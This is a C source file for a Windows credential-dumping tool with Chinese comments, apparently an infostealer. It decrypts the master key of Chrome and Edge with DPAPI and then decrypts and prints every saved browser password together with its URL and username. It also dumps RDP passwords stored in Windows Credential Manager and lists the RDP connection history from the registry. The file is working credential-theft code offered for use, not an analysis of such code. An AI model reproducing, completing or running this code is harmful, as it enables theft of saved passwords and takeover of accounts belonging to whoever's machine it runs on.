// file: laztool_advanced.c
// 编译: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_advanced.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib
// 运行: 必须以管理员身份运行

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <bcrypt.h>
#include "sqlite3.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef WLAN_PROFILE_GET_PLAINTEXT
#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
#endif

// --------------------- 辅助函数 ---------------------------------
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD GetProcessPid(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

// --------------------- 模块：Chromium 密码解密 --------------------
BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
    DATA_BLOB DataIn, DataOut;
    DataIn.pbData = pEncryptedData;
    DataIn.cbData = dwDataSize;
    if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        return NULL;
    }
    *pdwOutSize = DataOut.cbData;
    return DataOut.pbData;
}

BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen,
    const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL bResult = FALSE;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, keyLen, 0))) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (BYTE*)iv;
    authInfo.cbNonce = ivLen;
    authInfo.pbTag = (BYTE*)ciphertext + ciphertextLen - 16;
    authInfo.cbTag = 16;

    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextLen - 16, &authInfo, NULL, 0, plaintext, ciphertextLen - 16, plaintextLen, 0))) {
        bResult = TRUE;
    }
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserName) {
    wchar_t localStatePath[MAX_PATH];
    wcscpy_s(localStatePath, MAX_PATH, userDataPath);
    wcscat_s(localStatePath, MAX_PATH, L"\\Local State");

    // 1. 读取 Local State 文件
    HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] %S not found or inaccessible.\n", browserName);
        return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* jsonData = (char*)malloc(fileSize + 1);
    DWORD bytesRead = 0;
    ReadFile(hFile, jsonData, fileSize, &bytesRead, NULL);
    jsonData[fileSize] = '\0';
    CloseHandle(hFile);

    // 2. 解析 JSON 获取 encrypted_key
    char* keyTag = strstr(jsonData, "\"encrypted_key\":\"");
    if (!keyTag) { free(jsonData); return; }
    keyTag += 18;
    char* keyEnd = strstr(keyTag, "\"");
    if (!keyEnd) { free(jsonData); return; }
    *keyEnd = '\0';

    // 3. Base64 解码
    DWORD base64Len = 0;
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, NULL, &base64Len, NULL, NULL);
    BYTE* base64Decoded = (BYTE*)malloc(base64Len);
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, base64Decoded, &base64Len, NULL, NULL);

    // 4. 去除 "DPAPI" 前缀 (5字节)
    BYTE* encryptedKey = base64Decoded + 5;
    DWORD encryptedKeyLen = base64Len - 5;

    // 5. DPAPI 解密主密钥
    DWORD masterKeyLen = 0;
    BYTE* masterKey = DecryptDPAPIBlob(encryptedKey, encryptedKeyLen, &masterKeyLen);
    free(base64Decoded);
    if (!masterKey) { free(jsonData); return; }

    // 6. 读取 Login Data 数据库
    wchar_t loginDataPath[MAX_PATH];
    wcscpy_s(loginDataPath, MAX_PATH, userDataPath);
    wcscat_s(loginDataPath, MAX_PATH, L"\\Default\\Login Data");

    sqlite3* db;
    if (sqlite3_open16(loginDataPath, &db) == SQLITE_OK) {
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            printf("\n[+] ----- %S Saved Passwords -----\n", browserName);
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* username = (const char*)sqlite3_column_text(stmt, 1);
                const BYTE* encryptedPwd = (const BYTE*)sqlite3_column_blob(stmt, 2);
                int encryptedPwdLen = sqlite3_column_bytes(stmt, 2);

                if (encryptedPwdLen <= 15) continue;
                const BYTE* iv = encryptedPwd + 3;
                const BYTE* ciphertext = encryptedPwd + 15;
                DWORD ciphertextLen = encryptedPwdLen - 15;
                BYTE* decryptedPwd = (BYTE*)malloc(ciphertextLen);
                DWORD decryptedLen = 0;

                if (AesGcmDecrypt(masterKey, masterKeyLen, iv, 12, ciphertext, ciphertextLen, decryptedPwd, &decryptedLen)) {
                    decryptedPwd[decryptedLen] = '\0';
                    printf("  URL: %s\n", url);
                    printf("  Username: %s\n", username);
                    printf("  Password: %s\n\n", decryptedPwd);
                }
                free(decryptedPwd);
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    free(masterKey);
    free(jsonData);
}

// --------------------- 模块：RDP 保存密码 --------------------
void DumpRDPCredentials() {
    printf("\n[+] ===== RDP Saved Credentials =====\n");
    PCREDENTIALW* pCreds = NULL;
    DWORD dwCount = 0;
    if (CredEnumerateW(NULL, 0, &dwCount, &pCreds)) {
        int found = 0;
        for (DWORD i = 0; i < dwCount; i++) {
            if (wcsstr(pCreds[i]->TargetName, L"TERMSRV/") != NULL) {
                printf("\n[*] RDP Target: %S\n", pCreds[i]->TargetName);
                printf("    Username: %S\n", pCreds[i]->UserName);
                if (pCreds[i]->CredentialBlobSize > 0) {
                    printf("    Password: %S\n", (wchar_t*)pCreds[i]->CredentialBlob);
                } else {
                    printf("    Password: (empty)\n");
                }
                found++;
            }
        }
        CredFree(pCreds);
        if (found == 0) printf("[-] No RDP credentials found via CredEnumerate.\n");
    } else {
        printf("[-] CredEnumerate failed with error: %lu\n", GetLastError());
    }

    printf("\n[*] RDP Connection History (from registry):\n");
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwIndex = 0;
        wchar_t subkeyName[256];
        DWORD dwSize = 256;
        while (RegEnumKeyExW(hKey, dwIndex++, subkeyName, &dwSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            printf("  %S\n", subkeyName);
            dwSize = 256;
        }
        RegCloseKey(hKey);
    }
}

// --------------------- 主函数：构造用户目录并调用 --------------------
int main() {
    SetConsoleOutputCP(CP_UTF8);
    printf("=========================================================\n");
    printf("     Windows 凭据提取工具 v5.0 (管理员运行)             \n");
    printf("=========================================================\n");
    if (!IsElevated()) {
        printf("\n[-] Please run as Administrator.\n");
        getchar();
        return 1;
    }

    // 获取当前用户的 AppData Local 路径
    wchar_t appDataLocal[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal))) {
        wchar_t chromePath[MAX_PATH];
        wcscpy_s(chromePath, MAX_PATH, appDataLocal);
        wcscat_s(chromePath, MAX_PATH, L"\\Google\\Chrome\\User Data");
        ExtractChromePasswords(chromePath, L"Chrome");

        wchar_t edgePath[MAX_PATH];
        wcscpy_s(edgePath, MAX_PATH, appDataLocal);
        wcscat_s(edgePath, MAX_PATH, L"\\Microsoft\\Edge\\User Data");
        ExtractChromePasswords(edgePath, L"Edge");
    } else {
        printf("[-] Failed to get AppData path.\n");
    }

    DumpRDPCredentials();

    printf("\n[*] Execution completed.\n");
    return 0;
}
